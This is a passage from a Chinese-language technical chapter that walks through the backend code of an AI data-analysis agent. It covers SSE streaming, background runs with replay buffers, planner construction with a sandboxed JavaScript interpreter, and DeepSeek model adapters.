    ├── analyst/
    │   ├── agent.py / prompt.py
    │   └── skills/                  analysis / visualization 技能文档
    │
    ├── reviewer/
    │   ├── agent.py / prompt.py
    │   └── skills/
    │
    ├── middleware/
    │   ├── user_message_context.py  ★ 515 行，用户消息私有上下文 + 附件注入
    │   ├── semantic_recall_expansion.py  召回引用请求期展开
    │   ├── eval_delegations.py      把 PTC 委派记录写入 eval 的 ToolMessage
    │   └── message_timestamp.py     给模型响应打时间戳
    │
    └── tools/
        ├── shell.py                  Shell 工具
        └── view_image.py            图片查看工具
```

**模块依赖图**：

```
                    api/chat/router.py
                            │
        ┌───────────────────┼────────────────────┐
        ▼                   ▼                    ▼
ConversationTurnService  ConversationRunService  chat.py
        │                   │                    │
        │                   └────────┬───────────┘
        │                            ▼
        │                     AgentManager
        │                            │
        │                   ConversationAgentRuntimeFactory
        │                            │
        │            ┌───────────────┼───────────────┐
        │            ▼               ▼               ▼
        │      Planner 图    SpecialistAgentFactory  PostgresSandboxSessionStore
        │            │               │
        │            ▼               ▼
        │     delegation 工具   AgentSessionService
        │            │               │
        └────────────┴───────────────┘
                     │
                     ▼
              DockerSandboxManager（第 8 章）
```

## 9.3 具体实现

### 9.3.1 会话与回合的入口

`app/assistant/api/chat/router.py` 有 12 个接口，按功能分四组。

**会话管理**（普通 CRUD）：

```python
@router.post("/create", status_code=status.HTTP_201_CREATED)
async def api_create_conversation(
    body: chat_schema.CreateConversationRequest,
    conversation_repo: ConversationPGRepoDep,
    current_user: AnalysisUserDep,
) -> chat_schema.ConversationResponse:
    """创建新对话。"""
    user_id = current_user.id
    async with conversation_repo.session.begin():
        conversation = await conversation_repo.create(
            user_id,
            initial_conversation_title(body.initial_message),
            is_draft=body.is_draft,
        )
    initial_message = (body.initial_message or "").strip()
    if initial_message and not body.is_draft:
        try:
            enqueue_conversation_title(
                user_id,
                conversation.id,
                conversation.title,
                initial_message,
            )
        except Exception:  # noqa: BLE001
            logger.exception(
                f"提交会话标题任务失败，保留即时标题: conversation_id={conversation.id}"
            )
```

三个细节：

1. **`AnalysisUserDep` 而不是 `CurrentUserDep`**。前者额外要求用户绑定了可用的 Doris 角色（`AuthorizationService.require_analysis_access`）——因为创建会话的目的就是要做分析。
2. **草稿会话**（`is_draft=True`）。前端新建对话时先创建草稿，用户真正发出第一条消息才转正式。这样「点了一下新建然后关掉」不会留下一堆空会话。
3. **标题任务提交失败只记日志**。`initial_conversation_title` 已经给了即时标题（截取首条消息前若干字），LLM 生成更好的标题只是优化。

**SSE 流式入口**：

```python
@router.post(
    "/stream",
    response_class=StreamingResponse,
    responses={
        200: {
            "model": chat_schema.ChatStreamEvent,
            "description": "每个 SSE data 帧均为 ChatStreamEvent JSON",
            "content": {
                "text/event-stream": {
                    "schema": {"$ref": "#/components/schemas/ChatStreamEvent"}
                }
            },
        }
    },
)
async def api_stream_chat(
    body: chat_schema.ChatStreamRequest,
    conversation_repo: ConversationPGRepoDep,
    current_user: AnalysisUserDep,
    lifecycle: ConversationLifecycleServiceDep,
    agents: AgentManagerDep,
    runs: ConversationRunServiceDep,
) -> StreamingResponse:
    """启动后台对话回合并订阅 Agent 事件。"""
    user_id = current_user.id
    context.user_id_ctx.set(str(user_id))
    try:
        events = await ConversationTurnService(
            repository=conversation_repo,
            lifecycle=lifecycle,
            runs=runs,
            agents=agents,
        ).start(user_id, body.conversation_id, body.message)
    except ConversationMissingError as exc:
        raise chat_error.ConversationNotFoundError from exc
    except ActiveConversationRunError as exc:
        raise chat_error.ConversationRunConflictError from exc
    return StreamingResponse(
        _stream_run_events(
            body.conversation_id,
            events,
        ),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        },
    )
```

**三个要点**：

1. **`context.user_id_ctx.set(str(user_id))`**。这是 4.10 里讲的追踪上下文——设置之后所有日志都自动带 user_id。中间件设置不了（那时还没认证）。

2. **OpenAPI 声明 `model: ChatStreamEvent`**。虽然返回的是流，但把每个 data 帧的 schema 声明出来，前端就能用 OpenAPI 生成类型（`web/src/api/generated.ts` 就是这么来的）。

3. **两个响应头**：

   | 头 | 作用 |
   | --- | --- |
   | `Cache-Control: no-cache` | 禁止中间层缓存 SSE 响应 |
   | `X-Accel-Buffering: no` | **关闭 Nginx 的响应缓冲**。不加这个，Nginx 会攒够缓冲区才发给客户端，SSE 就变成「等几秒一次性出来」而不是流式 |

   **`X-Accel-Buffering: no` 是部署到 Nginx 后面时的必需项**，本地直连 uvicorn 看不出区别。

**SSE 帧序列化与心跳**：

```python
def _serialize_sse_event(event: chat_schema.ChatStreamEventPayload) -> str:
    """将聊天事件序列化为 SSE 数据帧。"""
    return f"data: {event.model_dump_json()}\n\n"
```

```python
async def _stream_run_events(
    conversation_id: UUID,
    events: AsyncGenerator[chat_schema.ChatStreamEventPayload],
) -> AsyncIterator[str]:
    """把后台 Run 事件投影为 SSE；连接断开只取消当前订阅。"""
    next_message_task: asyncio.Future[chat_schema.ChatStreamEventPayload] | None = None
    try:
        next_message_task = asyncio.ensure_future(anext(events))
        while True:
            done, _ = await asyncio.wait(
                {next_message_task},
                timeout=_SSE_HEARTBEAT_SECONDS,
            )
            if not done:
                yield ": keep-alive\n\n"
                continue

            try:
                event = next_message_task.result()
            except StopAsyncIteration:
                break

            yield _serialize_sse_event(event)
            next_message_task = asyncio.ensure_future(anext(events))
    except asyncio.CancelledError:
        logger.info(f"SSE 订阅断开: conversation_id={conversation_id}")
        raise
    finally:
        if next_message_task is not None and not next_message_task.done():
            next_message_task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await next_message_task
        await events.aclose()
```

**这段代码解决三个具体问题**：

1. **心跳**。`_SSE_HEARTBEAT_SECONDS = 15`。如果 15 秒没事件，发一个注释行 `: keep-alive`。**为什么需要**：Agent 可能在「思考」阶段几十秒不产出事件，中间的反向代理/防火墙会因为连接空闲而断开。SSE 注释行是标准的心跳方式（客户端会忽略）。

2. **`asyncio.wait` + `ensure_future` 而不是 `asyncio.wait_for(anext(...))`**。因为 `wait_for` 超时会**取消**被等待的协程——而 `anext(events)` 被取消后，生成器的状态就坏了，无法继续 `anext`。用 `wait` 只等待完成，超时了任务还在跑，下一轮继续等同一个任务。

3. **`finally` 里显式取消并 `aclose`**。客户端断开时（`CancelledError`），要：
   - 取消正在等待的 `next_message_task`；
   - `await` 它（用 `suppress` 吞掉取消异常），确保它真正结束；
   - `aclose()` 关闭事件生成器，让上游（Run 的订阅逻辑）执行清理。

   **不 `await` 被取消的任务会留下「pending task」**，在 asyncio 里会报 warning，长期运行会泄漏。

### 9.3.2 Run 与订阅解耦

这是全项目设计感最强的一块。要解决的问题：**SSE 连接断开不能杀掉 Agent 执行**。

朴素做法是「请求处理函数里直接跑 Agent，边跑边 yield」。问题：客户端刷新页面 = 连接断开 = 生成器被关闭 = Agent 执行被取消。用户辛苦等了两分钟的分析白费。

**做法**：把「执行」变成后台任务，「订阅」变成独立的可重入操作。

```python
@dataclass(slots=True)
class _ConversationRun:
    """一个独立于 SSE 订阅者生命周期的 Planner Run。"""

    cancel: asyncio.Event = field(default_factory=asyncio.Event)
    events: deque[RunEvent] = field(default_factory=deque)
    replay_bytes: int = 0
    subscribers: set[asyncio.Queue[RunEvent | None]] = field(default_factory=set)
    task: asyncio.Task[None] | None = None
```

一个 Run 包含：取消标志、**事件缓存**（deque）、缓存字节数、订阅者队列集合、后台任务。

**启动**：

```python
    async def _start(
        self,
        user_id: int,
        conversation_id: UUID,
        user_message: chat_schema.UserMessageRequest | None,
    ) -> AsyncGenerator[RunEvent]:
        """原子注册后台 Run，并返回包含首订阅者的事件流。"""
        key = (user_id, conversation_id)
        queue: asyncio.Queue[RunEvent | None] = asyncio.Queue(
            maxsize=_SUBSCRIBER_QUEUE_LIMIT
        )
        run = _ConversationRun()
        run.subscribers.add(queue)
        async with self._lock:
            existing = self._runs.get(key)
            if (
                existing is not None
                and existing.task is not None
                and not existing.task.done()
            ):
                raise ActiveConversationRunError
            self._runs[key] = run
            run.task = asyncio.create_task(
                self._execute(key, run, user_message),
                name=f"conversation-run:{user_id}:{conversation_id}",
            )
        return self._consume(run, queue, ())
```

**关键顺序**：先在锁内检查「是否已有运行中的 Run」（有就抛 `ActiveConversationRunError`，接口返回 409），再注册并 `create_task`。**检查和注册必须在同一个锁里**，否则两个并发请求可能都通过检查。

**给任务起名字**（`name=f"conversation-run:{user_id}:{conversation_id}"`）是个好习惯——`asyncio` 的调试输出和异常日志里会带上这个名字，排查时能一眼看出是哪个会话的任务。

**订阅**：

```python
    async def subscribe(
        self,
        user_id: int,
        conversation_id: UUID,
    ) -> AsyncGenerator[RunEvent]:
        """订阅当前 Run；Run 已结束时立即返回 done。"""
        key = (user_id, conversation_id)
        queue: asyncio.Queue[RunEvent | None] = asyncio.Queue(
            maxsize=_SUBSCRIBER_QUEUE_LIMIT
        )
        async with self._lock:
            run = self._runs.get(key)
            if run is None:
                return self._completed_subscription()
            replay = tuple(run.events)
            run.subscribers.add(queue)
        return self._consume(run, queue, replay)
```

**在锁内同时做两件事**：快照当前事件缓存（`replay`）+ 登记订阅者。这是**防漏收/防重复的关键**——如果分两次拿锁，可能出现「快照之后、登记之前」产生的事件既不在快照里也没进队列。

代码里的注释写明了这一点：

```python
    async def _publish(self, run: _ConversationRun, event: RunEvent) -> None:
        """按产生顺序缓存事件并广播给所有当前订阅者。"""
        async with self._lock:
            # 缓存快照与订阅登记共用一把锁：订阅者要么从 replay 得到该事件，
            # 要么已进入 subscribers 接收实时事件，不能漏收或重复接收。
            self._cache_event(run, event)
            subscribers = tuple(run.subscribers)
        for queue in subscribers:
            if not self._offer_event(queue, event):
                await self._drop_slow_subscriber(run, queue)
```

**事件缓存有两个上限**：

```python
_REPLAY_EVENT_LIMIT = 512
_REPLAY_BYTE_LIMIT = 2 * 1024 * 1024
_SUBSCRIBER_QUEUE_LIMIT = 256
```

```python
    def _cache_event(self, run: _ConversationRun, event: RunEvent) -> None:
        """将事件写入有数量和字节边界的重放窗口。"""
        if run.events:
            merged = self._merge_delta(run.events[-1], event)
            if merged is not None:
                previous = run.events.pop()
                run.replay_bytes -= self._event_size(previous)
                event = merged
        run.events.append(event)
        run.replay_bytes += self._event_size(event)
        while run.events and (
            len(run.events) > _REPLAY_EVENT_LIMIT
            or run.replay_bytes > _REPLAY_BYTE_LIMIT
        ):
            run.replay_bytes -= self._event_size(run.events.popleft())
```

**两个上限都必要**：条数上限防止「很多小事件」撑爆内存，字节上限防止「少量超大事件」（比如一个巨大的 ToolMessage）撑爆内存。**两个都要检查**，因为不同场景下瓶颈不同。

**增量事件的合并**：

```python
    @staticmethod
    def _merge_delta(previous: RunEvent, event: RunEvent) -> RunEvent | None:
        """合并同一消息连续产生的正文或思考增量。"""
        if (
            not isinstance(previous, _DELTA_EVENT_TYPES)
            or not isinstance(event, _DELTA_EVENT_TYPES)
            or type(previous) is not type(event)
        ):
            return None
        if event.reset:
            return None
        identity_fields = ("message_id", "delegation_id", "parent_tool_call_id")
        if any(
            getattr(previous, field, None) != getattr(event, field, None)
            for field in identity_fields
        ):
            return None
        return previous.model_copy(update={"delta": previous.delta + event.delta})
```

```python
_DELTA_EVENT_TYPES = (
    chat_schema.ChatStreamThinkingEvent,
    chat_schema.ChatStreamMessageDeltaEvent,
    chat_schema.ChatStreamSubagentThinkingEvent,
    chat_schema.ChatStreamSubagentMessageDeltaEvent,
)
```

**为什么合并**：模型流式输出时每个 token 产生一个事件，一段 1000 字的回答可能有几百个事件。如果全存进缓存，512 条上限瞬间用完，重连时只能回放最后几条。合并之后，「同一消息连续的增量」变成一条累积事件。

**合并的边界条件**：

- 只有 4 种 delta 事件能合并（其余是完整消息、状态、错误，合并没意义）。
- `reset=True` 不能合并（语义是「清空已有文本再追加」，合并会破坏语义）。
- `message_id` / `delegation_id` / `parent_tool_call_id` 必须一致（不同消息的增量不能混）。

**慢订阅者断开**：

```python
    @staticmethod
    def _offer_event(
        queue: asyncio.Queue[RunEvent | None],
        event: RunEvent | None,
    ) -> bool:
        """向订阅队列非阻塞写入事件，队列满时由调用方断开慢消费者。"""
        try:
            queue.put_nowait(event)
        except asyncio.QueueFull:
            return False
        return True

    async def _drop_slow_subscriber(
        self,
        run: _ConversationRun,
        queue: asyncio.Queue[RunEvent | None],
    ) -> None:
        """断开无法跟上实时事件的订阅者，避免其占用无界内存。"""
        async with self._lock:
            if queue not in run.subscribers:
                return
            run.subscribers.discard(queue)
        while not queue.empty():
            queue.get_nowait()
        queue.put_nowait(
            chat_schema.ChatStreamErrorEvent(
                type="error",
                content="事件流消费速度过慢，请重新连接以恢复最新状态。",
            )
        )
        queue.put_nowait(None)
```

**这是背压处理**。订阅队列上限 256 条。如果客户端消费太慢（网络差、页面卡住），队列会满。这时有几种选择：

| 方案 | 问题 |
| --- | --- |
| 阻塞等待 | 会拖慢整个 Run（一个慢客户端影响所有人） |
| 丢弃新事件 | 客户端看到的流不完整且不知道 |
| **断开慢客户端** | 客户端重新连接时能从 replay 拿到最新状态 |

选了第三种。断开时**先清空队列**再放入错误事件和 `None`（结束标记）——因为队列里积压的旧事件已经没意义了，直接跳到最新状态更好。

**停止**：

```python
    async def stop(self, user_id: int, conversation_id: UUID) -> bool:
        """显式停止指定 Conversation 的 Planner Run。"""
        async with self._lock:
            run = self._runs.get((user_id, conversation_id))
            if run is None or run.task is None or run.task.done():
                return False
            run.cancel.set()
            task = run.task
            task.cancel()
        await asyncio.gather(task, return_exceptions=True)
        return True
```

**两个动作都要做**：`run.cancel.set()` 是让 Agent 循环里的 `cancel.is_set()` 检查生效（优雅停止，让当前工具调用跑完），`task.cancel()` 是强制取消（如果它卡在某个 await 上）。

```python
            async for chunk in _execute_agent(
                input_messages,
                runtime,
                turn_context,
            ):
                if cancel.is_set():
                    logger.info(f"智能体执行已取消: conversation_id={conversation_id}")
                    break
```

`gather(..., return_exceptions=True)` 是因为任务可能抛 `CancelledError`，不捕获的话这里会跟着抛。

**结束**：

```python
    async def _finish(self, key: ConversationRunKey, run: _ConversationRun) -> None:
        """结束 Run 并通知订阅者关闭事件流。"""
        done = chat_schema.ChatStreamDoneEvent(type="done")
        async with self._lock:
            if self._runs.get(key) is run:
                self._runs.pop(key, None)
            self._cache_event(run, done)
            subscribers = tuple(run.subscribers)
        for queue in subscribers:
            if not self._offer_event(queue, done) or not self._offer_event(queue, None):
                await self._drop_slow_subscriber(run, queue)
```

`if self._runs.get(key) is run` 用**身份比较**而不是键比较。因为如果同一个键被新 Run 覆盖了（理论上不会，因为 `_start` 会先检查），不应该把新 Run 删掉。

`done` 事件也会进缓存——这样重连的客户端能立刻知道「已经结束了」。

### 9.3.3 事件投影：从 LangGraph 流到 SSE 事件

`app/assistant/services/chat.py` 的 `_run_agent_turn` 是核心：

```python
async def _run_agent_turn(
    agents: AgentRuntimeManager,
    files: ConversationFileInspector,
    user_id: int,
    conversation_id: UUID,
    input_messages: list[BaseMessage] | None,
    cancel: asyncio.Event,
) -> AsyncGenerator[chat_schema.ChatStreamEventPayload]:
    """执行新回合或从待执行 Checkpoint 恢复同一回合。"""
    runtime = await agents.get_conversation_runtime(user_id, conversation_id)
    async with agents.execution(
        user_id,
        conversation_id,
        runtime=runtime,
    ) as turn_context:
        continuation_count = 0
        thinking_message_ids: set[str] = set()
        text_message_ids: set[str] = set()
        while True:
            last_finish_reason: str | None = None

            async for chunk in _execute_agent(
                input_messages,
                runtime,
                turn_context,
            ):
```

**`stream_mode=["updates", "custom", "messages"]` 三种模式的区别**（在 `_execute_agent` 里）：

```python
    async for chunk in runtime.planner.astream(
        input={"messages": input_messages} if input_messages is not None else None,
        config=config,
        stream_mode=["updates", "custom", "messages"],
        version="v2",
    ):
        yield chunk
```

| 模式 | 产出什么 | 用途 |
| --- | --- | --- |
| `messages` | 模型 token 级增量 | 实时显示思考与正文（打字机效果） |
| `custom` | 工具里通过 `stream_writer` 写的数据 | 子 Agent 的活动（委派进度） |
| `updates` | 每个节点完成后的状态更新 | 完整的消息（带 message_id、finish_reason） |

**三种都需要，因为它们服务不同目的**：`messages` 给实时性，`updates` 给完整性（`messages` 的增量拼起来可能和最终消息不一致），`custom` 给子 Agent 的可观测性。

**分发逻辑**：

```python
                if chunk.get("type") == "custom":
                    activity = chunk.get("data")
                    if isinstance(
                        activity,
                        (
                            SubagentMessageActivity,
                            SubagentMessageDeltaActivity,
                            SubagentThinkingDeltaActivity,
                            SubagentStatusActivity,
                        ),
                    ):
                        event = await subagent_activity_to_event(
                            activity,
                            user_id,
                            conversation_id,
                        )
                        if event is not None:
                            yield event
                    continue
                if chunk.get("type") == "messages":
                    data = chunk.get("data")
                    if not isinstance(data, tuple) or len(data) != 2:
                        continue
                    message, _metadata = data
                    if not isinstance(message, AIMessageChunk):
                        continue
                    reasoning = reasoning_text(message)
                    if message.id is None:
                        continue
                    message_id = str(message.id)
                    if reasoning is not None:
                        reset = message_id not in thinking_message_ids
                        thinking_message_ids.add(message_id)
                        yield chat_schema.ChatStreamThinkingEvent(
                            type="thinking",
                            message_id=message_id,
                            delta=reasoning,
                            reset=reset,
                        )
                    if text := message_text(message):
                        reset = message_id not in text_message_ids
                        text_message_ids.add(message_id)
                        yield chat_schema.ChatStreamMessageDeltaEvent(
                            type="message_delta",
                            message_id=message_id,
                            delta=text,
                            reset=reset,
                        )
                    continue
```

**`reset` 的语义**：`reset = message_id not in thinking_message_ids` —— **第一次见到这个 message_id 时 `reset=True`**，之后都是 `False`。

前端收到 `reset=True` 就清空该消息已有的文本再追加。为什么需要这个：模型可能对同一条消息分多次生成（比如工具调用后继续），每次的增量是独立的，前端需要知道「这是新的开始」还是「接着前面继续」。

**`updates` 模式的处理**：

```python
                if chunk.get("type") != "updates":
                    continue
                data = chunk.get("data")
                if not isinstance(data, dict):
                    continue

                responses: list[chat_schema.MessageResponse] = []
                for node in ("model", "tools"):
                    update = data.get(node)
                    messages = (
                        update.get("messages") if isinstance(update, dict) else None
                    )
                    if not isinstance(messages, list):
                        continue
                    for message in messages:
                        response = await langchain_message_to_schema_with_artifacts(
                            message,
                            files,
                            user_id,
                            conversation_id,
                        )
                        if response is not None:
                            responses.append(response)
```

只处理 `model` 和 `tools` 两个节点的更新——其余节点（比如中间件节点）不产出面向用户的消息。

**自动续写（continuation）**：

```python
            if (
                cancel.is_set()
                or last_finish_reason is None
                or last_finish_reason == "stop"
            ):
                break
            if continuation_count >= turn_context.max_continuations:
                raise PlannerContinuationLimitError(
                    turn_context.max_continuations,
                    last_finish_reason,
                )

            continuation_count += 1
            # 空增量会保留 Checkpointer 中的已有状态并继续生成。
            input_messages = []
```

**这是处理「模型被 max_tokens 截断」的机制**。如果 `finish_reason` 是 `length`（达到输出上限），说明模型话没说完。这时用**空输入**再调一次——LangGraph 会从 Checkpoint 恢复状态继续生成。

`max_continuations` 默认 3（配置里 `agent.orchestration.max_continuations: 3`），防止无限循环。

`PlannerContinuationLimitError` 抛出后会被 `ConversationRunService._execute` 捕获，发一个 error 事件给前端。

### 9.3.4 Planner 的构造

```python
def create_planner_agent(
    *,
    model: BaseChatModel,
    tools: Sequence[BaseTool],
    backend: DockerSandboxBackend,
    checkpointer: BaseCheckpointSaver,
    session_service: AgentSessionService,
    shell_jobs: ShellJobRuntime,
    interpreter_memory_limit_bytes: int,
) -> CompiledStateGraph:
    """使用显式解释器配置编译 Planner Agent。"""
    interpreter = CodeInterpreterMiddleware(
        mode="thread",
        ptc=list(_INTERPRETER_PTC),
        timeout=float("inf"),
        memory_limit=interpreter_memory_limit_bytes,
        max_ptc_calls=None,
    )
    filesystem = FilesystemMiddleware(
        backend=backend,
        tools=["read_file"],
    )
    return create_deep_agent(
        model=model,
        tools=[
            *tools,
            *create_view_image_tools(model),
            *create_shell_tools(shell_jobs),
        ],
        system_prompt=PLANNER_SYSTEM_PROMPT,
        middleware=cast(
            "Sequence[AgentMiddleware[Any, Any, Any]]",
            [
                EvalDelegationMiddleware(session_service),
                filesystem,
                interpreter,
                UserMessageContextMiddleware(
                    backend,
                    backend.conversation_dir,
                    shell_jobs,
                ),
                MessageTimestampMiddleware(),
            ],
        ),
        subagents=[],
        backend=backend,
        checkpointer=checkpointer,
        name="planner",
    )
```

**`CodeInterpreterMiddleware`（QuickJS 解释器）是 Planner 的核心编排能力**：

```python
_INTERPRETER_PTC = ("delegation",)
```

`ptc` 是「pass-through call」——允许解释器**直接调用指定的工具**。这里只允许 `delegation`。

**这个设计的意图**：模型可以写 JavaScript 代码来做并行编排：

```javascript
// 模型在 eval 里写的代码（示意）
const [a, b] = await Promise.all([
  delegation({analysis_id: "a1", agent_type: "explorer", session_id: "s1", message: "..."}),
  delegation({analysis_id: "a1", agent_type: "explorer", session_id: "s2", message: "..."})
]);
```

**为什么要这样**：提示词里要求「相互独立的任务使用 `Promise.all` 并行调度」。如果只靠模型的工具调用循环，它只能一次调一个。有了 QuickJS，模型能写真正的并发逻辑。

**但 PTC 只放开了 `delegation`**——模型不能在解释器里调 `shell` 或 `read_file`。这限制了「模型在解释器里做危险操作」的可能。

`timeout=float("inf")` 配合 `max_ptc_calls=None`，意思是「解释器本身不限时、不限调用次数」。**看起来危险，但实际上受另外两层约束**：外层有 `asyncio` 任务取消（用户点停止），`memory_limit` 限制了 QuickJS 堆大小（默认 64MB）。

**Planner 的文件权限被刻意限制**：

```python
    filesystem = FilesystemMiddleware(
        backend=backend,
        tools=["read_file"],
    )
```

**只有 `read_file`**。没有 `write_file` / `edit_file`。这对应提示词里的要求：

> **严格禁止**：自身不直接编写或执行 SQL，不进行数据计算或图表渲染，也不使用 Shell 工具修改文件。

Planner 能读文件（看专业 Agent 的产物）、能跑只读 shell（看目录结构），但不能改任何东西。**能力约束落在工具列表上，不是靠提示词。**

**中间件的顺序**：

```python
            [
                EvalDelegationMiddleware(session_service),
                filesystem,
                interpreter,
                UserMessageContextMiddleware(
                    backend,
                    backend.conversation_dir,
                    shell_jobs,
                ),
                MessageTimestampMiddleware(),
            ],
```

| 中间件 | 作用 |
| --- | --- |
| `EvalDelegationMiddleware` | 把 QuickJS 里发起的委派记录写进 `eval` 的 ToolMessage（供前端展示） |
| `FilesystemMiddleware` | 文件工具（只读） |
| `CodeInterpreterMiddleware` | QuickJS 解释器 |
| `UserMessageContextMiddleware` | 把用户消息的接收时间和附件注入模型请求 |
| `MessageTimestampMiddleware` | 给模型响应打时间戳 |

### 9.3.5 模型适配

`app/assistant/model_factory.py` 里有三个类，处理 DeepSeek 的特殊性。

**问题一：流式 chunk 的 ID 不稳定**。

```python
class DataAgentResponses(ChatOpenAI):
    """为每次 Responses API 调用分配稳定的公开消息 ID。"""

    def _stream(self, *args: Any, **kwargs: Any) -> Iterator[ChatGenerationChunk]:
        """统一同一次同步流式调用的 chunk ID。"""
        message_id = str(uuid4())
        for chunk in self._stream_responses(*args, **kwargs):
            chunk.message.id = message_id
            yield chunk

    async def _astream(
        self,
        *args: Any,
        **kwargs: Any,
    ) -> AsyncIterator[ChatGenerationChunk]:
        """统一同一次异步流式调用的 chunk ID。"""
        message_id = str(uuid4())
        async for chunk in self._astream_responses(*args, **kwargs):
            chunk.message.id = message_id
            yield chunk
```

**为什么必须统一 ID**：前端靠 `message_id` 把增量拼成一条消息（`chatStore.appendMessageDelta`）。如果每个 chunk 的 ID 不同，前端会把每个 token 当成一条新消息——屏幕上会出现几百条消息。

**问题二：DeepSeek 的明文思考（reasoning）**。

```python
def _convert_deepseek_responses_chunk(
    chunk: Any,
    current_index: int,
    current_output_index: int,
    current_sub_index: int,
    *,
    schema: Any,
    metadata: dict[str, Any],
    has_reasoning: bool,
    output_version: str | None,
) -> tuple[int, int, int, ChatGenerationChunk | None]:
    """补充 LangChain 尚未处理的 DeepSeek 明文思考增量。"""
    if chunk.type != "response.reasoning_text.delta":
        return openai_chat_base._convert_responses_chunk_to_generation_chunk(  # pyright: ignore[reportPrivateUsage]
            chunk,
            current_index,
            current_output_index,
            current_sub_index,
            schema=schema,
            metadata=metadata,
            has_reasoning=has_reasoning,
            output_version=output_version,
        )
```

**这段在做 LangChain 还没支持的事**。DeepSeek 的 Responses API 会发 `response.reasoning_text.delta` 类型的 chunk（模型的思考过程），而当时的 LangChain 不认这个类型。所以要手动转成 `AIMessageChunk`：

```python
    if current_output_index != chunk.output_index:
        current_index += 1
    current_output_index = chunk.output_index
    current_sub_index = chunk.content_index
    return (
        current_index,
        current_output_index,
        current_sub_index,
        ChatGenerationChunk(
            message=AIMessageChunk(
                content=[
                    {
                        "type": "reasoning",
                        "content": [
                            {
                                "type": "reasoning_text",
                                "text": chunk.delta,
                                "index": chunk.content_index,
                            }
                        ],
                        "index": current_index,
                    }
                ]
            )
        ),
    )
```

**问题三：无状态重放**。

```python
class DataAgentDeepSeekResponses(DataAgentResponses):
    """适配 DeepSeek 无状态 Responses thinking 续轮。"""

    def bind_tools(
        self,
        tools: Sequence[dict[str, Any] | type | Callable | BaseTool],
        *,
        tool_choice: dict | str | bool | None = None,
        strict: bool | None = None,
        parallel_tool_calls: bool | None = None,
        response_format: Any = None,
        **kwargs: Any,
    ) -> Runnable[LanguageModelInput, AIMessage]:
        """绑定工具但不发送 DeepSeek thinking 模式不支持的 tool_choice。"""
        del tool_choice
        return super().bind_tools(
            tools,
            strict=strict,
            parallel_tool_calls=parallel_tool_calls,
            response_format=response_format,
            **kwargs,
        )
```

`del tool_choice` —— **显式丢弃这个参数**，因为 DeepSeek 的 thinking 模式不支持它。传了会报错。

```python
    def _get_request_payload(
        self,
        input_: LanguageModelInput,
        *,
        stop: list[str] | None = None,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """保留 DeepSeek 下一次工具调用必须回传的明文 reasoning item。"""
        # LangChain 会在 store=false 时移除 OpenAI 无法无状态重放的明文
        # reasoning。DeepSeek 本身始终无状态，并要求客户端完整回传该 item，
        # 因此先按完整历史序列化，再把发往 Provider 的 store 恢复为 false。
        kwargs["store"] = True
        payload = super()._get_request_payload(input_, stop=stop, **kwargs)
        payload["store"] = False
        return payload
```

**这是一段很聪明的 hack，注释解释得很清楚**：

- OpenAI 的 Responses API 有「服务端保存会话」的机制（`store=True`）。开了这个，客户端不需要回传历史。
- LangChain 在 `store=False` 时会**移除**明文 reasoning item（因为「无状态模式下 OpenAI 不认这个」）。
- 但 **DeepSeek 本身始终是无状态的**，并且**要求客户端把 reasoning item 完整回传**（下一轮工具调用需要它）。
- 所以：**构造 payload 时临时把 `store` 设成 `True`**（骗过 LangChain，让它保留 reasoning），**拿到 payload 后再改回 `False`**（发往 DeepSeek 时不开启服务端存储）。

**模型构造**：

```python
def create_configured_model(model_name: str) -> BaseChatModel:
    """按配置名称创建聊天模型。"""
    try:
        model_cfg = app_config.cfg.lm_config.models[model_name]
    except KeyError as exc:
        raise ValueError(f"未知的语言模型配置: {model_name}") from exc
    register_harness_profile(
        f"{model_cfg.model_provider}:{model_cfg.model}",
        HarnessProfile(
            general_purpose_subagent=GeneralPurposeSubagentProfile(enabled=False),
        ),
    )
```

**`GeneralPurposeSubagentProfile(enabled=False)` 关掉了 deepagents 框架自带的「通用子 Agent」**。因为本项目自己实现了 `delegation` 机制，框架自带的那个会和它冲突（两套委派逻辑）。

```python
    profile = cast(
        ModelProfile,
        {
            **model_cfg.profile.model_dump(),
            "image_tool_message": model_cfg.api_protocol == "responses"
            and model_cfg.profile.image_inputs,
        },
    )
```

`image_tool_message` 只在「Responses 协议 + 支持图片输入」时开启。这是给 `view_image` 工具用的——它需要把图片作为 tool message 发给模型。

```python
    model_kwargs = {
        **model_cfg.params,
        "model": model_cfg.model,
        "base_url": model_cfg.base_url,
        "api_key": model_cfg.api_key.get_secret_value(),
        "profile": profile,
        "max_retries": 0,
        "streaming": True,
    }
```

**`max_retries: 0` 是刻意的**。因为项目自己实现了续写机制（`max_continuations`），客户端层的重试会干扰它。而且重试会重复计费。

```python
    if model_cfg.api_protocol == "responses":
        model_class = (
            DataAgentDeepSeekResponses
            if model_cfg.model_provider == "deepseek"
            else DataAgentResponses
        )
        return model_class(
            **model_kwargs,
            timeout=_REQUEST_TIMEOUT_SECONDS,
            use_responses_api=True,
            output_version="responses/v1",
            store=False,
            use_previous_response_id=False,
        )
    if model_cfg.model_provider == "openrouter":
        # ChatOpenRouter 将 timeout 原样映射到毫秒制 timeout_ms。
        return ChatOpenRouter(
            **model_kwargs,
            timeout=_REQUEST_TIMEOUT_SECONDS * 1000,
        )
    return init_chat_model(
        model_provider=model_cfg.model_provider,
        **model_kwargs,
        timeout=_REQUEST_TIMEOUT_SECONDS,
    )
```

三条分支按协议走：

| 协议 | 类 | 关键参数 |
| --- | --- | --- |
| `responses` | `DataAgentDeepSeekResponses` / `DataAgentResponses` | `use_responses_api=True`, `store=False`, `use_previous_response_id=False` |
| `chat_completions` + openrouter | `ChatOpenRouter` | timeout 要乘 1000（毫秒） |
| `chat_completions` + 其它 | `init_chat_model` | 通用路径 |

**`store=False` + `use_previous_response_id=False`**：明确告诉客户端「服务端不要存会话，我每次传完整历史」。这样模型调用是无状态的，可重试、可并行。

**`timeout` 的单位坑**：`ChatOpenRouter` 的 timeout 是**毫秒**，而 `ChatOpenAI` 是**秒**。所以 `_REQUEST_TIMEOUT_SECONDS * 1000`。注释专门写了这一点。

### 9.3.6 会话级运行时缓存与生命周期

`AgentManager` 管理三样东西：会话级运行时的 LRU 缓存、执行登记、删除。

**运行时的结构**：

```python
@dataclass(slots=True)
class ConversationAgentRuntime:
    """一个用户会话内的 Agent 运行时资源。"""

    planner: CompiledStateGraph
    session_service: AgentSessionService
    shell_jobs: ShellJobRuntime
    planner_lock: Callable[[], AbstractAsyncContextManager[None]]
    conversation_deleted: Callable[[], Awaitable[bool]]
```

